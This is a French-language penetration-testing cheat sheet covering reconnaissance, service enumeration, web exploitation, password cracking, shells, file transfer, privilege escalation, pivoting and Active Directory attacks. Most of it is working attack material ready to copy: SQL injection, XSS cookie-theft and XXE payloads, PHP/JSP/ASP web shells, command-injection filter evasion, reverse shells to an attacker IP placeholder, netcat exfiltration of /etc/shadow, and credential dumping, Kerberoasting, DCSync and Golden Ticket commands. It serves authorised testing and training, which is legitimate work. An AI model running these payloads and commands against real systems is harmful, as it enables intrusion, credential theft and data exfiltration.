# Cheat Sheet

Reference rapide des commandes et techniques couvrant l'ensemble du parcours, organisee par phase d'un engagement. Pensee pour etre cherchee au Ctrl+F en plein test.

## Reconnaissance passive

### DNS et sous-domaines

```bash
# - Transfert de zone
dig axfr domaine.tld @ns1.domaine.tld

# - Enumeration de sous-domaines
gobuster dns -d domaine.tld -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
subfinder -d domaine.tld -silent

# - Records specifiques
dig MX domaine.tld
dig TXT domaine.tld
dig ANY domaine.tld @8.8.8.8

# - Reverse DNS
dig -x <IP_CIBLE>

# - WHOIS
whois domaine.tld
```

### OSINT et fingerprinting

```bash
# - Identification des technologies
whatweb http://<IP_CIBLE>
curl -s -I http://<IP_CIBLE>

# - Certificate Transparency
curl -s "https://crt.sh/?q=%25.domaine.tld&output=json" | jq '.[].name_value' | sort -u

# - Google dorks
# site:domaine.tld filetype:pdf
# site:domaine.tld inurl:admin
# site:domaine.tld ext:sql | ext:bak | ext:conf
```

---

## Scan reseau

### Nmap

```bash
# - Decouverte d'hotes
nmap -sn 10.10.10.0/24

# - Scan rapide (top 1000 ports)
nmap -sV --open -oA scan_rapide <IP_CIBLE>

# - Scan complet
nmap -sV -sC -p- -oA scan_complet <IP_CIBLE>

# - Scan UDP (lent, cibler les ports courants)
nmap -sU --top-ports 50 <IP_CIBLE>

# - Scan agressif avec OS detection
nmap -A -T4 -p- <IP_CIBLE>

# - Scripts specifiques
nmap --script=vuln <IP_CIBLE>
nmap --script=smb-enum-shares,smb-enum-users -p 445 <IP_CIBLE>
nmap --script=http-enum -p 80,443 <IP_CIBLE>
```

| Flag | Usage |
|---|---|
| `-sV` | Detection de version |
| `-sC` | Scripts par defaut |
| `-O` | Detection d'OS |
| `-p-` | Tous les ports (65535) |
| `-sU` | Scan UDP |
| `-sS` | SYN scan (stealth) |
| `-sT` | Connect scan (via proxy) |
| `--open` | Afficher uniquement les ports ouverts |
| `-oA` | Sauvegarder en tous formats |
| `-T4` | Vitesse agressive |
| `--min-rate 1000` | Forcer le debit minimum |

---

## Enumeration de services

### FTP (21)

```bash
# - Connexion anonyme
ftp <IP_CIBLE>
# Login: anonymous / Password: (vide)

# - Lister et telecharger
ls -la
get fichier.txt
mget *.conf

# - Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP_CIBLE>
```

### SSH (22)

```bash
# - Connexion
ssh utilisateur@<IP_CIBLE>
ssh -i cle_privee utilisateur@<IP_CIBLE>

# - Brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP_CIBLE>
```

### SMTP (25)

```bash
# - Enumeration d'utilisateurs
smtp-user-enum -M VRFY -U users.txt -t <IP_CIBLE>

# - Connexion manuelle
nc -nv <IP_CIBLE> 25
HELO test
VRFY admin
```

### DNS (53)

```bash
# - Transfert de zone
dig axfr @<IP_CIBLE> domaine.tld

# - Brute force de sous-domaines
dnsenum --dnsserver <IP_CIBLE> -f subdomains.txt domaine.tld
```

### SMB (445)

```bash
# - Enumeration
crackmapexec smb <IP_CIBLE>
smbclient -L //<IP_CIBLE> -N
smbmap -H <IP_CIBLE>
enum4linux-ng <IP_CIBLE>

# - Connexion a un partage
smbclient //<IP_CIBLE>/partage -U utilisateur

# - Enumeration avec credentials
crackmapexec smb <IP_CIBLE> -u utilisateur -p motdepasse --shares
crackmapexec smb <IP_CIBLE> -u utilisateur -p motdepasse --users

# - Telecharger recursivement
smbget -R smb://<IP_CIBLE>/partage -U utilisateur
```

### SNMP (161 UDP)

```bash
# - Enumeration
snmpwalk -v2c -c public <IP_CIBLE>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP_CIBLE>

# - Brute force de community strings
hydra -P community_strings.txt <IP_CIBLE> snmp
```

### MySQL (3306)

```bash
# - Connexion
mysql -h <IP_CIBLE> -u root -p

# - Enumeration a distance
nmap --script=mysql-enum,mysql-info -p 3306 <IP_CIBLE>
```

### MSSQL (1433)

```bash
# - Connexion
impacket-mssqlclient utilisateur@<IP_CIBLE> -windows-auth

# - Execution de commandes (si xp_cmdshell actif)
# SQL> EXEC xp_cmdshell 'whoami';

# - Activer xp_cmdshell
# SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
# SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### RDP (3389)

```bash
# - Connexion
xfreerdp /v:<IP_CIBLE> /u:utilisateur /p:motdepasse /cert:ignore /dynamic-resolution

# - Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://<IP_CIBLE>
```

### WinRM (5985)

```bash
# - Connexion
evil-winrm -i <IP_CIBLE> -u utilisateur -p motdepasse

# - Avec hash NTLM
evil-winrm -i <IP_CIBLE> -u utilisateur -H <HASH_NTLM>
```

---

## Enumeration web

### Fuzzing de repertoires

```bash
# - GoBuster
gobuster dir -u http://<IP_CIBLE> \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak -t 50

# - ffuf
ffuf -u http://<IP_CIBLE>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .php,.html,.txt -t 50

# - Filtrage ffuf (exclure par taille, code, mots)
ffuf -u http://<IP_CIBLE>/FUZZ -w wordlist.txt -fs 0
ffuf -u http://<IP_CIBLE>/FUZZ -w wordlist.txt -fc 403,404
ffuf -u http://<IP_CIBLE>/FUZZ -w wordlist.txt -fw 12
```

### Virtual hosts

```bash
# - Enumeration de vhosts
gobuster vhost -u http://domaine.tld \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# - ffuf (filtrer par taille de reponse par defaut)
ffuf -u http://domaine.tld -H "Host: FUZZ.domaine.tld" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <TAILLE_PAR_DEFAUT>
```

### Fuzzing de parametres

```bash
# - Decouvrir des parametres GET
ffuf -u http://<IP_CIBLE>/page?FUZZ=test \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

# - Decouvrir des parametres POST
ffuf -u http://<IP_CIBLE>/page -X POST \
  -d "FUZZ=test" -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0

# - Fuzzer des valeurs
ffuf -u http://<IP_CIBLE>/page?id=FUZZ -w <(seq 1 1000) -fs 0
```

### CMS

```bash
# - WordPress
wpscan --url http://<IP_CIBLE> --enumerate u,p,t
wpscan --url http://<IP_CIBLE> -U admin -P /usr/share/wordlists/rockyou.txt

# - Drupal
droopescan scan drupal -u http://<IP_CIBLE>

# - Joomla
joomscan -u http://<IP_CIBLE>
```

---

## Exploitation web

### Injection SQL

{% tabs %}
{% tab title="Manuelle" %}
```
# - Detection
' OR 1=1-- -
' OR 1=1#
" OR 1=1-- -

# - Nombre de colonnes (ORDER BY)
' ORDER BY 1-- -
' ORDER BY 2-- -
# ... incrementer jusqu'a l'erreur

# - UNION SELECT
' UNION SELECT 1,2,3-- -
' UNION SELECT NULL,NULL,NULL-- -

# - Enumeration des bases
' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -

# - Enumeration des tables
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='db'-- -

# - Enumeration des colonnes
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -

# - Extraction
' UNION SELECT username,password FROM users-- -

# - Lecture de fichiers (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -

# - Ecriture de fichier (MySQL, si FILE priv)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -
```
{% endtab %}
{% tab title="SQLMap" %}
```bash
# - Detection automatique
sqlmap -u "http://<IP_CIBLE>/page?id=1" --batch

# - Depuis une requete Burp
sqlmap -r request.txt --batch

# - Enumeration
sqlmap -u "http://<IP_CIBLE>/page?id=1" --dbs
sqlmap -u "http://<IP_CIBLE>/page?id=1" -D db --tables
sqlmap -u "http://<IP_CIBLE>/page?id=1" -D db -T users --dump

# - Shell OS
sqlmap -u "http://<IP_CIBLE>/page?id=1" --os-shell

# - Bypass WAF
sqlmap -u "http://<IP_CIBLE>/page?id=1" --tamper=space2comment --random-agent

# - Forcer la technique
sqlmap -u "http://<IP_CIBLE>/page?id=1" --technique=U  # Union
sqlmap -u "http://<IP_CIBLE>/page?id=1" --technique=B  # Boolean blind
sqlmap -u "http://<IP_CIBLE>/page?id=1" --technique=T  # Time blind
```
{% endtab %}
{% endtabs %}

### XSS

```javascript
// - Detection
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// - Vol de cookies
<script>new Image().src="http://<IP_ATTAQUANT>/?c="+document.cookie</script>

// - Contournements courants
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="&#97;lert(1)">
<script>eval(atob('YWxlcnQoMSk='))</script>
```

### Inclusion de fichiers (LFI)

```
# - LFI basique
http://<IP_CIBLE>/page?file=../../../../etc/passwd

# - Wrappers PHP
http://<IP_CIBLE>/page?file=php://filter/convert.base64-encode/resource=index.php
http://<IP_CIBLE>/page?file=php://input  (POST: <?php system('id'); ?>)
http://<IP_CIBLE>/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=

# - Log poisoning
# 1. Injecter du PHP dans le User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://<IP_CIBLE>
# 2. Inclure le log
http://<IP_CIBLE>/page?file=/var/log/apache2/access.log&cmd=id

# - Contournements
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
/etc/passwd%00  (PHP < 5.3)
```

### Upload de fichiers

```bash
# - Web shell PHP minimal
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# - Contournements d'extension
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.phtml
shell.php5

# - Contournement de Content-Type
# Changer Content-Type: application/x-php → image/jpeg

# - Contournement de magic bytes
# Ajouter GIF89a; en debut de fichier PHP
printf 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.php.gif
```

### Injection de commandes

```
# - Operateurs de chaining
; id
| id
|| id
& id
&& id
$(id)
`id`

# - Contournements d'espaces
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat$IFS$9/etc/passwd
cat%09/etc/passwd

# - Contournement de filtres sur les mots
c'a't /etc/passwd
c\at /etc/passwd
${PATH:0:1}  # = /
who$(printf "\x61")mi  # = whoami

# - Newline injection
%0aid
```

#### Obfuscation avancée (Linux)

```bash
# - Extraction de caracteres depuis les variables d'environnement
${PATH:0:1}          # = /  (premier char de $PATH)
${LS_COLORS:10:1}    # = ;  (position variable selon le systeme)

# - Decalage ASCII (character shifting)
echo $(tr '!-}' '"-~'<<<[)   # = \  (decale [ de +1 en ASCII)

# - Manipulation de casse (contourner blacklist exacte)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")     # = whoami
$(a="WhOaMi";printf%09%s%09"${a,,}")  # variante bash 4+

# - Inversion de commande
echo 'whoami' | rev          # -> imaohw
$(rev<<<'imaohw')            # execute whoami

# - Encodage base64
echo -n 'cat /etc/passwd' | base64   # -> Y2F0IC9ldGMvcGFzc3dk
bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dk)

# - Encodage hexadecimal avec xxd (si base64 est bloque)
echo -n 'whoami' | xxd -p             # -> 77686f616d69
bash<<<$(xxd -r -p<<<77686f616d69)   # execute whoami

# - Payload complet (newline + IFS + extraction slash)
127.0.0.1%0ac'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

#### Obfuscation avancée (Windows)

```cmd
:: - Extraction depuis %HOMEPATH% (\Users\...) -> \
echo %HOMEPATH:~0,1%

:: - PowerShell : premier caractere de HOMEPATH
$env:HOMEPATH[0]

:: - Manipulation de casse (insensible natif CMD/PS)
WhOaMi
```

| Technique | Linux | Windows |
|---|---|---|
| Extraire `/` | `${PATH:0:1}` | `%HOMEPATH:~0,1%` |
| Extraire `;` | `${LS_COLORS:10:1}` | N/A (utiliser `%0a` ou `&`) |
| Decalage ASCII | `$(tr '!-}' '"-~'<<<[)` | N/A |
| Casse | `$(tr "[A-Z]" "[a-z]"<<<"CMD")` | Natif (insensible) |
| Inversion | `$(rev<<<'dmc')` | `iex "$('imaohw'[-1..-20] -join '')"` |
| Base64 | `bash<<<$(base64 -d<<<PAYLOAD)` | `iex "$([...FromBase64String('PAYLOAD')])"` |
| Hex (xxd) | `bash<<<$(xxd -r -p<<<HEXVAL)` | N/A |

### XXE

```xml
<!-- - Lecture de fichier -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- - SSRF -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

<!-- - Out-of-band (blind) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://<IP_ATTAQUANT>/evil.dtd">
%dtd;
```

---

## Brute force et cassage

### Hydra

```bash
# - SSH
hydra -l utilisateur -P wordlist.txt ssh://<IP_CIBLE>

# - FTP
hydra -l utilisateur -P wordlist.txt ftp://<IP_CIBLE>

# - HTTP POST form
hydra -l admin -P wordlist.txt <IP_CIBLE> http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# - HTTP Basic Auth
hydra -l admin -P wordlist.txt <IP_CIBLE> http-get /admin

# - RDP
hydra -l admin -P wordlist.txt rdp://<IP_CIBLE>

# - Limiter la vitesse (eviter les lockouts)
hydra -l admin -P wordlist.txt ssh://<IP_CIBLE> -t 4 -W 5
```

### Hashcat

| Mode | Type de hash |
|---|---|
| `0` | MD5 |
| `100` | SHA1 |
| `1400` | SHA256 |
| `1000` | NTLM |
| `3000` | LM |
| `1800` | SHA-512 (Unix) |
| `500` | MD5 (Unix) |
| `5600` | NetNTLMv2 |
| `13100` | Kerberoasting (TGS-REP) |
| `18200` | AS-REP Roasting |
| `22000` | WPA-PBKDF2-PMKID+EAPOL |

```bash
# - Dictionnaire
hashcat -m <MODE> hash.txt /usr/share/wordlists/rockyou.txt

# - Avec regles
hashcat -m <MODE> hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# - Brute force masque
hashcat -m <MODE> hash.txt -a 3 ?u?l?l?l?d?d?d?d
# ?l=minuscule ?u=majuscule ?d=chiffre ?s=special ?a=tout
```

### John the Ripper

```bash
# - Format automatique
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# - Extraction de hash depuis un fichier
ssh2john id_rsa > id_rsa.hash
zip2john archive.zip > zip.hash
keepass2john database.kdbx > keepass.hash
pdf2john fichier.pdf > pdf.hash
office2john document.docx > office.hash

# - Afficher les mots de passe craques
john --show hash.txt
```

---

## Shells

### Reverse shells

{% tabs %}
{% tab title="Bash" %}
```bash
bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1
bash -c 'bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1'
```
{% endtab %}
{% tab title="Python" %}
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<IP_ATTAQUANT>",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```
{% endtab %}
{% tab title="PowerShell" %}
```powershell
$c=New-Object Net.Sockets.TCPClient('<IP_ATTAQUANT>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}
```
{% endtab %}
{% tab title="PHP" %}
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP_ATTAQUANT>/4444 0>&1'"); ?>
```
{% endtab %}
{% tab title="Netcat" %}
```bash
# - Avec -e
nc -e /bin/bash <IP_ATTAQUANT> 4444

# - Sans -e (mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP_ATTAQUANT> 4444 >/tmp/f
```
{% endtab %}
{% endtabs %}

### Listener et stabilisation

```bash
# - Listener
nc -nlvp 4444
rlwrap nc -nlvp 4444  # meilleur historique

# - Stabilisation
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 120
```

### Web shells

```bash
# - PHP
echo '<?php system($_GET["cmd"]); ?>' > cmd.php
# Usage: http://<IP_CIBLE>/cmd.php?cmd=id

# - JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# - ASP
<% eval request("cmd") %>
```

---

## Transfert de fichiers

{% tabs %}
{% tab title="Vers la cible (Linux)" %}
```bash
# - HTTP (depuis la machine d'attaque)
python3 -m http.server 8080
# Sur la cible :
wget http://<IP_ATTAQUANT>:8080/fichier
curl http://<IP_ATTAQUANT>:8080/fichier -o fichier

# - SCP
scp fichier utilisateur@<IP_CIBLE>:/tmp/

# - Base64
base64 fichier | tr -d '\n'
# Sur la cible :
echo "<BASE64>" | base64 -d > fichier

# - Netcat
# Attaquant :
nc -nlvp 9999 < fichier
# Cible :
nc <IP_ATTAQUANT> 9999 > fichier
```
{% endtab %}
{% tab title="Vers la cible (Windows)" %}
```powershell
# - PowerShell
Invoke-WebRequest http://<IP_ATTAQUANT>:8080/fichier -OutFile C:\Temp\fichier
(New-Object Net.WebClient).DownloadFile('http://<IP_ATTAQUANT>:8080/fichier','C:\Temp\fichier')
iwr http://<IP_ATTAQUANT>:8080/fichier -o C:\Temp\fichier

# - Certutil
certutil -urlcache -split -f http://<IP_ATTAQUANT>:8080/fichier C:\Temp\fichier

# - SMB (depuis l'attaquant)
impacket-smbserver partage . -smb2support
# Sur la cible :
copy \\<IP_ATTAQUANT>\partage\fichier C:\Temp\fichier
```
{% endtab %}
{% tab title="Exfiltration" %}
```bash
# - Upload HTTP (serveur Python)
python3 -c "
import http.server, cgi
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
        f = form['file']
        open(f.filename,'wb').write(f.file.read())
        self.send_response(200)
        self.end_headers()
http.server.HTTPServer(('0.0.0.0',8080),H).serve_forever()
"

# - Netcat
# Attaquant (recevoir) :
nc -nlvp 9999 > exfil.txt
# Cible (envoyer) :
nc <IP_ATTAQUANT> 9999 < /etc/shadow
```
{% endtab %}
{% endtabs %}

---

## Escalade de privileges

### Linux

```bash
# - Enumeration rapide
id
sudo -l
find / -perm -4000 2>/dev/null          # SUID
find / -perm -2000 2>/dev/null          # SGID
getcap -r / 2>/dev/null                 # Capabilities
cat /etc/crontab; ls -la /etc/cron*     # Cron jobs
ls -la /etc/passwd /etc/shadow          # Permissions
env                                      # Variables d'environnement
ps auxww                                # Processus

# - Outils automatises
./linpeas.sh | tee linpeas.txt
./pspy64                                # Surveiller les processus sans root
```

| Vecteur | Verification | Exploitation |
|---|---|---|
| **sudo** | `sudo -l` | GTFOBins pour le binaire autorise |
| **SUID** | `find / -perm -4000` | GTFOBins pour le binaire SUID |
| **Capabilities** | `getcap -r /` | `cap_setuid` sur python/perl = root |
| **Cron** | `cat /etc/crontab` | Modifier le script execute par root |
| **PATH hijacking** | Cron/SUID sans chemin absolu | Creer un binaire du meme nom dans PATH |
| **Wildcard injection** | Cron avec `*` dans tar/rsync | Fichiers nommes comme des flags |
| **Kernel** | `uname -r` | Exploit kernel (DirtyPipe, etc.) |
| **Docker/LXD** | `id` (groupe docker/lxd) | Monter le filesystem hote |
| **Writable /etc/passwd** | `ls -la /etc/passwd` | Ajouter un utilisateur root |

### Windows

```powershell
# - Enumeration rapide
whoami /all
net user
net localgroup Administrators
systeminfo
cmdkey /list                          # Credentials sauvegardes
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # Autologon

# - Outils automatises
.\winPEASx64.exe
Import-Module .\PowerUp.ps1; Invoke-AllChecks
```

| Vecteur | Verification | Exploitation |
|---|---|---|
| **SeImpersonate** | `whoami /priv` | PrintSpoofer, GodPotato, JuicyPotato |
| **SeBackup** | `whoami /priv` | Copier SAM/SYSTEM, extraire les hashes |
| **SeTakeOwnership** | `whoami /priv` | Prendre possession de fichiers sensibles |
| **AlwaysInstallElevated** | `reg query HKLM\...\Installer` | MSI malveillant execute en SYSTEM |
| **Unquoted service path** | `wmic service get name,pathname` | DLL/exe dans le chemin non quote |
| **Service writable** | `accesschk.exe -uwcv *` | Modifier le binPath du service |
| **Autologon** | Registry Winlogon | Credentials en clair |
| **SAM/SYSTEM** | Copier depuis `C:\Windows\System32\config\` | `secretsdump.py LOCAL -sam SAM -system SYSTEM` |

---

## Pivoting

### SSH

```bash
# - Dynamic port forwarding (proxy SOCKS)
ssh -D 8081 -N -f utilisateur@<IP_PIVOT>
# Configurer /etc/proxychains.conf : socks4 127.0.0.1 8081
proxychains nmap -sT -p 80,445,3389 <RESEAU_INTERNE>

# - Local port forwarding
ssh -L <PORT_LOCAL>:<IP_INTERNE>:<PORT_DISTANT> utilisateur@<IP_PIVOT>
# Exemple : acceder au RDP d'un hote interne
ssh -L 13389:172.16.8.20:3389 utilisateur@<IP_PIVOT>

# - Remote port forwarding
ssh -R <PORT_DISTANT>:127.0.0.1:<PORT_LOCAL> utilisateur@<IP_PIVOT>

# - Stabiliser le tunnel
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -D 8081 utilisateur@<IP_PIVOT>
```

### Chisel

```bash
# - Serveur (machine d'attaque)
./chisel server -p 8888 --reverse

# - Client SOCKS (hote compromis)
./chisel client <IP_ATTAQUANT>:8888 R:socks

# - Client port forward
./chisel client <IP_ATTAQUANT>:8888 R:8080:172.16.8.20:80
```

### Ligolo-ng

```bash
# - Proxy (machine d'attaque)
./proxy -selfcert -laddr 0.0.0.0:11601

# - Agent (hote compromis)
./agent -connect <IP_ATTAQUANT>:11601 -ignore-cert

# - Sur le proxy
>> session
>> start
sudo ip route add 172.16.8.0/24 dev ligolo
```

---

## Active Directory

### Enumeration

```bash
# - BloodHound (collecte)
.\SharpHound.exe -c All
proxychains bloodhound-python -u utilisateur -p motdepasse -d DOMAINE.LOCAL -ns <IP_DC> -c All

# - PowerView
Import-Module .\PowerView.ps1
Get-DomainUser | select samaccountname,description
Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember
Find-DomainShare -CheckShareAccess
Get-DomainGPO | select displayname,gpcfilesyspath
Get-ObjectAcl -Identity "utilisateur" -ResolveGUIDs

# - ldapsearch
ldapsearch -x -H ldap://<IP_DC> -D "DOMAINE\\utilisateur" -w motdepasse -b "DC=DOMAINE,DC=LOCAL"
```

### Attaques courantes

{% tabs %}
{% tab title="Kerberoasting" %}
```bash
# - Enumerer les comptes avec SPN
proxychains GetUserSPNs.py DOMAINE/utilisateur -dc-ip <IP_DC>

# - Extraire le ticket TGS
proxychains GetUserSPNs.py DOMAINE/utilisateur -dc-ip <IP_DC> -request

# - Craquer
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
```
{% endtab %}
{% tab title="AS-REP Roasting" %}
```bash
# - Sans credentials
proxychains GetNPUsers.py DOMAINE/ -usersfile users.txt -dc-ip <IP_DC> -no-pass

# - Avec credentials
proxychains GetNPUsers.py DOMAINE/utilisateur -dc-ip <IP_DC>

# - Craquer
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```
{% endtab %}
{% tab title="LLMNR Poisoning" %}
```bash
# - Responder
sudo responder -I eth0 -dwPv

# - Craquer les hashes NetNTLMv2 captures
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
{% endtab %}
{% tab title="Password Spraying" %}
```bash
# - CrackMapExec
crackmapexec smb <IP_DC> -u users.txt -p 'MotDePasse2024!' --continue-on-success

# - Kerbrute
kerbrute passwordspray -d DOMAINE.LOCAL --dc <IP_DC> users.txt 'MotDePasse2024!'
```
{% endtab %}
{% endtabs %}

### Mouvement lateral

```bash
# - Pass-the-Hash
crackmapexec smb <IP_CIBLE> -u administrateur -H <HASH_NTLM>
psexec.py DOMAINE/administrateur@<IP_CIBLE> -hashes :<HASH_NTLM>
evil-winrm -i <IP_CIBLE> -u administrateur -H <HASH_NTLM>

# - Abus ACL : ForceChangePassword
$pass = ConvertTo-SecureString 'NouveauMdP!' -AsPlainText -Force
Set-DomainUserPassword -Identity cible -AccountPassword $pass

# - Abus ACL : GenericWrite (faux SPN pour Kerberoasting cible)
Set-DomainObject -Identity cible -SET @{serviceprincipalname='faux/SPN'}

# - Extraction de secrets
secretsdump.py DOMAINE/utilisateur@<IP_CIBLE>
crackmapexec smb <IP_CIBLE> -u admin -p motdepasse --sam
crackmapexec smb <IP_CIBLE> -u admin -p motdepasse --lsa
```

### Compromission du domaine

```bash
# - DCSync
secretsdump.py DOMAINE/utilisateur_da@<IP_DC>

# - Golden Ticket
ticketer.py -nthash <HASH_KRBTGT> -domain-sid <SID> -domain DOMAINE.LOCAL administrateur

# - Pass-the-Ticket
export KRB5CCNAME=administrateur.ccache
psexec.py -k -no-pass DOMAINE.LOCAL/administrateur@dc01.domaine.local
```

---

## Metasploit

```bash
# - Recherche
search type:exploit platform:windows smb
search cve:2021-34527

# - Utilisation d'un module
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP_CIBLE>
set LHOST <IP_ATTAQUANT>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# - Meterpreter
getuid
sysinfo
hashdump
getsystem
upload /tmp/outil.exe C:\\Temp\\outil.exe
download C:\\Users\\admin\\flag.txt
shell
bg                    # Mettre la session en arriere-plan
sessions -l           # Lister les sessions
sessions -i 1         # Reprendre la session 1

# - Pivoting Meterpreter
run autoroute -s 172.16.8.0/24
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

---

## Outils Impacket (reference rapide)

| Outil | Usage |
|---|---|
| `psexec.py` | Shell SYSTEM via SMB (depots de service) |
| `wmiexec.py` | Shell semi-interactif via WMI |
| `smbexec.py` | Shell via SMB sans ecrire de binaire |
| `atexec.py` | Execution via taches planifiees |
| `evil-winrm` | Shell via WinRM (pas Impacket mais complementaire) |
| `secretsdump.py` | Extraction SAM/LSA/NTDS/DCSync |
| `GetUserSPNs.py` | Kerberoasting |
| `GetNPUsers.py` | AS-REP Roasting |
| `ticketer.py` | Forge de tickets Kerberos |
| `lookupsid.py` | Enumeration SID/RID |
| `mssqlclient.py` | Client MSSQL interactif |

---

## Wordlists utiles

| Wordlist | Chemin | Usage |
|---|---|---|
| **rockyou.txt** | `/usr/share/wordlists/rockyou.txt` | Cassage de mots de passe |
| **directory-list-2.3-medium** | `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` | Fuzzing web |
| **subdomains-top1million-5000** | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` | Enumeration DNS |
| **common-snmp-community** | `/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt` | SNMP |
| **burp-parameter-names** | `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt` | Fuzzing de parametres |
| **raft-medium-words** | `/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt` | Fuzzing web (alternatif) |
| **xato-net-10-million** | `/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt` | Mots de passe (alternatif) |

---

## Ressources rapides

| Ressource | URL |
|---|---|
| **GTFOBins** | gtfobins.github.io |
| **LOLBAS** | lolbas-project.github.io |
| **RevShells** | revshells.com |
| **CyberChef** | gchq.github.io/CyberChef |
| **PayloadsAllTheThings** | github.com/swisskyrepo/PayloadsAllTheThings |
| **HackTricks** | book.hacktricks.wiki |
| **Wadcoms** | wadcoms.github.io |

***
